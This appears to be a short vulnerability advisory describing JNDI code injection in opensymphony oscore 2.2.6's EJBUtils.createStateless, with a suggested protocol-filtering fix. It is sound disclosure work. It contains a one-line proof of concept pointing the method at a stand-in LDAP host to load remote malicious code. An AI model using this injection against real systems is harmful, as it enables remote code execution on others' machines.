# Code injection Vulnerability in opensymphony:oscore:2.2.6

**Affected Version**

The latest version 2.2.6 and below.

**Affected Components**

```
com/opensymphony/util/EJBUtils.java
```

**Describe the Vulnerability**

There is a method, `com.opensymphony.util.EJBUtils.createStateless`, designed to create a `Stateless`. However, passing an unchecked argument to this API can lead to the execution of arbitrary commands. For instance, following codes can lead to the execution of arbitrary commands from attackers:

```java
EJBUtils.createStateless("ldap://example.com/Evil");
```

**To Reproduce**

First, build an LDAP server and provide malicious codes. Then, just execute above codes will reproduce it.

**Fix Suggestion**

Filter LDAP, RMI and related protocols when using `lookup`.